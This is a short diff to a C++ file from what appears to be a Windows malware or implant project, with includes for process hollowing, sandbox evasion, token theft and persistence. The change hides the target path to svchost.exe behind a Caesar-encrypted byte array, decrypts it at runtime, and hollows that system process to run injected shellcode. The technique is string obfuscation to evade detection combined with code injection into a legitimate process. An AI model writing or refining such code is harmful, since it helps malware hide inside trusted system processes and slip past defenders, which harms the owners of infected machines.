@@ -1,13 +1,7 @@
 #include "Injection.h"
 #include "Crypt.h"
-#include "evasion\ProcessHollowing.h"
 #include "evasion\Evasion.h"
-#include "evasion\Sandbox.h"
-#include "privilegeEscalation\TokenTheft.h"
-#include "Persistence.h"
-#include <iostream>
-#include <tlhelp32.h>
-#include <windows.h>
+#include "evasion\ProcessHollowing.h"
 
 
 void start_testing(void) {
@@ -16,7 +10,8 @@ void start_testing(void) {
 	Injection injection;
 	injection.shellcode;
 
-	std::string targetProcess = "C:\\Windows\\System32\\svchost.exe";
-
-	hollowing.HollowProcess(targetProcess, injection.shellcode);
+	//std::string targetProcess = "C:\\Windows\\System32\\svchost.exe";
+	std::vector<unsigned char> targetProcess = { 0x21, 0x18, 0x3a, 0x35, 0x47, 0x4c, 0x42, 0x4d, 0x55, 0x51, 0x3a, 0x31, 0x57, 0x51, 0x52, 0x43, 0x4b, 0x11, 0x10, 0x3a, 0x51, 0x54, 0x41, 0x46, 0x4d, 0x51, 0x52, 0x0c, 0x43, 0x56, 0x43 };
+	
+	hollowing.HollowProcess(Crypt::decryptCaesar(targetProcess, 0xDE), injection.shellcode);
 }
